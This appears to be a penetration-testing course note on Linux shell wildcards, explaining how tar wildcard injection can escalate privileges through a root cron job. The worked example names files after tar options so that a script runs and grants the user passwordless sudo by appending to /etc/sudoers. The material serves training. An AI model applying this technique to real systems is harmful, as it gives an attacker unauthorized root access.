## Table of Contents

  - [Table of Contents](#Table\of\Contents)
          - [Example](#Example)

## Table of Contents

          - [Example](#Example)

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

|**Character**|**Significance**|
|:-:|:-:|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|


An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the `man page` for `tar` we see:
```bash
--checkpoint-action=ACTION
--checkpoint=[]
```
`--checkpoint-action`: Permits an `EXEC` action to be executed when a checkpoint is reached. An arbitrary operating system command once the tar command triggers. 
- By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options.
###### Example
Consider the *cron job* which is set to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. the Cron job is set to run every minute. So it is a good candidate for privilege escalation

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

echo "" > "--checkpoint-action=exec=sh root.sh"

echo "" > --checkpoint=1

```






